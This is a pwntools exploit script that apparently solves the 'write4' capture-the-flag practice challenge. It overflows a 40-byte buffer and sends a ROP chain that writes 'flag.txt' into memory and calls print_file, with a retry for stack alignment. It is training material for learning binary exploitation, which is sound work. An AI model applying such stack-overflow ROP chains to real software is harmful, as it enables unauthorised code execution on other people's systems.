from pwn import *

context.binary = "./write4"
elf = ELF("./write4")

def exploit(padding = False):
  p = process()
  rop = ROP(elf)
  if padding:
    rop.raw(rop.ret)
  rop(r14=0x601028, r15=b"flag.txt")
  rop.usefulGadgets()
  rop.print_file(0x601028)

  print(f"ROP chain:\n{rop.dump()}")

  offset = 40
  payload = b"A" * offset
  payload += rop.chain()

  print(f"Payload: {payload}")

  p.sendline(payload)
  return p.recvline_regex(rb".*{.*}.*").decode('ascii')

try:
  log.success(exploit())
except EOFError:
  log.failure("Stack alignment is needed")
  log.success(exploit(True))